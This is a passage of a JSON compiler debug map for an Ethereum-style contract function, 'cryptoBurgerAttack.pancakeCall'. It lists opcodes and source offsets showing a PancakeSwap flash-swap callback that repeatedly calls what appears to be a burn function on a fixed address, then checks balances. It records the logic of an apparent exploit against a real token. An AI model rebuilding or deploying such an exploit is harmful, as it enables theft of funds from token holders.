      "value": "0x0"
    },
    "7389": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7390": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7391": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7392": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "LT",
      "path": "0"
    },
    "7393": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1CEC"
    },
    "7396": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7397": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1CEC"
    },
    "7400": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "7403": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9667,
        9682
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7404": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7405": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "7407": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7408": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7409": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "MUL",
      "path": "0"
    },
    "7410": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7411": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7412": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7413": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "ADD",
      "path": "0"
    },
    "7414": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7415": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "ADD",
      "path": "0"
    },
    "7416": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9682
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7417": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7419": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7420": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7421": {
      "op": "DUP2"
    },
    "7422": {
      "op": "DUP2"
    },
    "7423": {
      "op": "MSTORE"
    },
    "7424": {
      "op": "SWAP1"
    },
    "7425": {
      "op": "DUP2"
    },
    "7426": {
      "op": "ADD"
    },
    "7427": {
      "op": "DUP4"
    },
    "7428": {
      "op": "SWAP1"
    },
    "7429": {
      "op": "MSTORE"
    },
    "7430": {
      "op": "PUSH32",
      "value": "0x486F77206D7563682049206E65656420666F7220616E6F746865722073776170"
    },
    "7463": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "7465": {
      "op": "DUP3"
    },
    "7466": {
      "op": "ADD"
    },
    "7467": {
      "op": "MSTORE"
    },
    "7468": {
      "op": "SWAP2"
    },
    "7469": {
      "op": "DUP3"
    },
    "7470": {
      "op": "ADD"
    },
    "7471": {
      "op": "MSTORE"
    },
    "7472": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "7474": {
      "op": "ADD"
    },
    "7475": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7477": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7478": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7479": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7480": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "SUB",
      "path": "0"
    },
    "7481": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7482": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9627,
        9683
      ],
      "op": "LOG1",
      "path": "0"
    },
    "7483": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9721,
        9730
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7485": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9716,
        9829
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7486": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9740,
        9743
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x8D"
    },
    "7488": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9736,
        9737
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7489": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9736,
        9743
      ],
      "op": "LT",
      "path": "0"
    },
    "7490": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9716,
        9829
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7491": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9716,
        9829
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1DDA"
    },
    "7494": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9716,
        9829
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7495": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9780
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 67,
      "value": "0x1"
    },
    "7497": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9780
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "7498": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7500": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7501": {
      "op": "PUSH4",
      "value": "0x2770A7EB"
    },
    "7506": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "7508": {
      "op": "SHL"
    },
    "7509": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7510": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "7511": {
      "offset": [
        733,
        775
      ],
      "op": "PUSH20",
      "path": "0",
      "value": "0x2B0551B656509754285EEC81EE894338E14C5DD"
    },
    "7532": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7534": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7535": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "ADD",
      "path": "0"
    },
    "7536": {
      "op": "MSTORE"
    },
    "7537": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9805,
        9817
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C25E0DCC1BD1C0000"
    },
    "7548": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "7550": {
      "op": "DUP3"
    },
    "7551": {
      "op": "ADD"
    },
    "7552": {
      "op": "MSTORE"
    },
    "7553": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7555": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7557": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "7559": {
      "op": "SHL"
    },
    "7560": {
      "op": "SUB"
    },
    "7561": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9780
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7562": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9780
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7563": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9780
      ],
      "op": "AND",
      "path": "0"
    },
    "7564": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9780
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7565": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9785
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x9DC29FAC"
    },
    "7570": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9785
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7571": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "7573": {
      "op": "ADD"
    },
    "7574": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7578": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7579": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7580": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP4",
      "path": "0"
    },
    "7581": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "SUB",
      "path": "0"
    },
    "7582": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7583": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7585": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP8",
      "path": "0"
    },
    "7586": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7587": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "7588": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7589": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7590": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7591": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1DAF"
    },
    "7594": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7595": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7597": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7598": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "REVERT",
      "path": "0"
    },
    "7599": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7600": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "POP",
      "path": "0"
    },
    "7601": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "GAS",
      "path": "0"
    },
    "7602": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "CALL",
      "path": "0"
    },
    "7603": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7604": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7605": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7606": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1DC3"
    },
    "7609": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7610": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7611": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7613": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7614": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "7615": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7616": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7618": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "REVERT",
      "path": "0"
    },
    "7619": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7620": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "POP",
      "path": "0"
    },
    "7621": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "POP",
      "path": "0"
    },
    "7622": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "POP",
      "path": "0"
    },
    "7623": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9764,
        9818
      ],
      "op": "POP",
      "path": "0"
    },
    "7624": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "DUP1",
      "path": "0",
      "statement": 68
    },
    "7625": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7626": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1DD2"
    },
    "7629": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7630": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2E3A"
    },
    "7633": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9745,
        9748
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7634": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7635": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7636": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "POP",
      "path": "0"
    },
    "7637": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9745,
        9748
      ],
      "op": "POP",
      "path": "0"
    },
    "7638": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9716,
        9829
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1D3D"
    },
    "7641": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9716,
        9829
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7642": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9716,
        9829
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7643": {
      "op": "POP"
    },
    "7644": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9920
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 69,
      "value": "0x1"
    },
    "7646": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9920
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "7647": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7649": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7650": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "7655": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "7657": {
      "op": "SHL"
    },
    "7658": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7659": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "7660": {
      "offset": [
        733,
        775
      ],
      "op": "PUSH20",
      "path": "0",
      "value": "0x2B0551B656509754285EEC81EE894338E14C5DD"
    },
    "7681": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7683": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7684": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "ADD",
      "path": "0"
    },
    "7685": {
      "op": "MSTORE"
    },
    "7686": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "7688": {
      "op": "DUP1"
    },
    "7689": {
      "op": "MLOAD"
    },
    "7690": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7692": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "7695": {
      "op": "DUP4"
    },
    "7696": {
      "op": "CODECOPY"
    },
    "7697": {
      "op": "DUP2"
    },
    "7698": {
      "op": "MLOAD"
    },
    "7699": {
      "op": "SWAP2"
    },
    "7700": {
      "op": "MSTORE"
    },
    "7701": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7702": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7704": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7706": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "7708": {
      "op": "SHL"
    },
    "7709": {
      "op": "SUB"
    },
    "7710": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9920
      ],
      "op": "AND",
      "path": "0"
    },
    "7711": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9920
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7712": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9930
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "7717": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9930
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7718": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "7720": {
      "op": "ADD"
    },
    "7721": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "7723": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7725": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7726": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7727": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP4",
      "path": "0"
    },
    "7728": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "SUB",
      "path": "0"
    },
    "7729": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7730": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP7",
      "path": "0"
    },
    "7731": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "GAS",
      "path": "0"
    },
    "7732": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "7733": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7734": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7735": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7736": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1E45"
    },
    "7739": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7740": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7741": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7744": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "7745": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7746": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7748": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "REVERT",
      "path": "0"
    },
    "7749": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7750": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "POP",
      "path": "0"
    },
    "7751": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "POP",
      "path": "0"
    },
    "7752": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "POP",
      "path": "0"
    },
    "7753": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "POP",
      "path": "0"
    },
    "7754": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7756": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7757": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7758": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "7760": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "NOT",
      "path": "0"
    },
    "7761": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "7763": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7764": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "ADD",
      "path": "0"
    },
    "7765": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "AND",
      "path": "0"
    },
    "7766": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7767": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "ADD",
      "path": "0"
    },
    "7768": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7769": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7771": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "7772": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "POP",
      "path": "0"
    },
    "7773": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7774": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "ADD",
      "path": "0"
    },
    "7775": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7776": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1E69"
    },
    "7779": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7780": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7781": {
